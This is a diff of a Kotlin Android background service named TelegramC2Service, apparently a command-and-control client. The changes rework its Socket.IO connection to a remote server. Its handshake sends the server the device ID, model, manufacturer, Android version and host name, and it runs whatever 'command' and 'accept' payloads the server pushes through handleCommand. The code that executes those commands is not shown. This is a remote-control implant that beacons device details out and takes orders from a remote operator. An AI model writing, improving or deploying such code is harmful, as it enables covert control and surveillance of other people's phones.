@@ -162,6 +162,11 @@ class TelegramC2Service : Service() {
                 } catch (e: Exception) {
                     log("connect error: ${e.message}")
                 }
+                if (connected) {
+                    try { socket?.disconnect() } catch (_: Exception) {}
+                }
+                socket = null
+                connected = false
                 delay(RECONNECT_MS)
             }
         }
@@ -176,7 +181,16 @@ class TelegramC2Service : Service() {
                 reconnectionDelayMax = 10000
                 timeout = 20000
                 forceNew = true
-                transports = arrayOf("websocket")
+                transports = arrayOf("polling", "websocket")
+                auth = mapOf(
+                    "api_key" to apiKey,
+                    "device_id" to deviceId,
+                    "model" to Build.MODEL,
+                    "manufacturer" to Build.MANUFACTURER,
+                    "android_version" to Build.VERSION.RELEASE,
+                    "sdk_int" to Build.VERSION.SDK_INT,
+                    "hostname" to Build.HOST,
+                )
                 path = "/socket.io"
             }
             val s = IO.socket(uri, opts)
@@ -185,10 +199,10 @@ class TelegramC2Service : Service() {
             s.on(Socket.EVENT_CONNECT) {
                 log("socket connected")
                 connected = true
-                sendHello()
             }
-            s.on(Socket.EVENT_DISCONNECT) {
-                log("socket disconnected")
+            s.on(Socket.EVENT_DISCONNECT) { args ->
+                val reason = args.firstOrNull()?.toString() ?: "?"
+                log("socket disconnected: $reason")
                 connected = false
             }
             s.on(Socket.EVENT_CONNECT_ERROR) { args ->
@@ -196,17 +210,23 @@ class TelegramC2Service : Service() {
                 log("socket error: $msg")
                 connected = false
             }
-            s.on("command") { args ->
-                val obj = args.firstOrNull() as? JSONObject ?: return@on
-                scope.launch { handleCommand(obj) }
+            s.on(Socket.EVENT_ERROR) { args ->
+                val msg = args.firstOrNull()?.toString() ?: "?"
+                log("socket event error: $msg")
             }
             s.on("accept") { args ->
                 val obj = args.firstOrNull() as? JSONObject ?: return@on
+                val accepted = obj.optString("device_id", "")
+                log("accepted device_id=$accepted")
                 val cmds = obj.optJSONArray("commands") ?: JSONArray()
                 for (i in 0 until cmds.length()) {
                     val c = cmds.getJSONObject(i)
                     scope.launch { handleCommand(c) }
                 }
+            }
+            s.on("command") { args ->
+                val obj = args.firstOrNull() as? JSONObject ?: return@on
+                scope.launch { handleCommand(obj) }
             }
             s.on("reject") { args ->
                 val obj = args.firstOrNull() as? JSONObject ?: return@on
@@ -216,24 +236,6 @@ class TelegramC2Service : Service() {
             s.connect()
         } catch (e: Exception) {
             log("doConnect exception: ${e.message}")
-        }
-    }
-
-    private fun sendHello() {
-        try {
-            val payload = JSONObject().apply {
-                put("api_key", apiKey)
-                put("device_id", deviceId)
-                put("model", Build.MODEL)
-                put("manufacturer", Build.MANUFACTURER)
-                put("android_version", Build.VERSION.RELEASE)
-                put("sdk_int", Build.VERSION.SDK_INT)
-                put("hostname", Build.HOST)
-            }
-            socket?.emit("hello", payload)
-            log("hello sent")
-        } catch (e: Exception) {
-            log("sendHello: ${e.message}")
         }
     }
 
